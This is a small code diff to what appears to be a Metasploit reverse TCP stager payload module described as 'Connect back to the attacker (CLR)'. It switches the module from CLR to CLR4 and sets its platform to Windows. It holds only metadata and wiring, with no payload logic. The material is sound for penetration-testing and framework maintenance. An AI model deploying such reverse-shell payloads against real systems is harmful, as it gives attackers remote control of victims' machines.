@@ -4,7 +4,7 @@
 ##
 
 require 'msf/core/handler/reverse_tcp'
-require 'msf/core/payload/clr/reverse_tcp'
+require 'msf/core/payload/clr4/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -13,7 +13,7 @@ module MetasploitModule
   CachedSize = 283
 
   include Msf::Payload::Stager
-  include Msf::Payload::Clr::ReverseTcp
+  include Msf::Payload::Clr4::ReverseTcp
 
   def initialize(info = {})
     super(merge_info(info,
@@ -21,8 +21,8 @@ module MetasploitModule
       'Description' => 'Connect back to the attacker (CLR)',
       'Author'      => ['OJ Reeves'],
       'License'     => MSF_LICENSE,
-      'Platform'    => 'clr',
-      'Arch'        => ARCH_CLR,
+      'Platform'    => 'windows',
+      'Arch'        => ARCH_CLR4,
       'Handler'     => Msf::Handler::ReverseTcp,
       'Stager'      => {}
     ))
